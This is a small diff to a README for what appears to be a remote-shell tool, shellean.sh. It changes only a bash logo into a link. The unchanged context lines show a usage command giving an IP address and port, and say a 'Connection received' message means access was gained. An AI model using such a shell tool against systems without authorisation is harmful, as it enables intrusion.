@@ -6,4 +6,6 @@
 **2. Run shellean.sh. `$ ./shellean.sh -a 192.168.1.109 -p 1234`**  
 **3. If you get this message `Connection received` it means you gained access.**  
 
-<img src="https://www.vectorlogo.zone/logos/gnu_bash/gnu_bash-icon.svg" alt="bash" width="50" height="50" />
+  <a href="https://www.gnu.org/software/bash/" target="_blank" rel="noreferrer">
+    <img src="https://www.vectorlogo.zone/logos/gnu_bash/gnu_bash-icon.svg" alt="bash" width="50" height="50" />
+  </a>
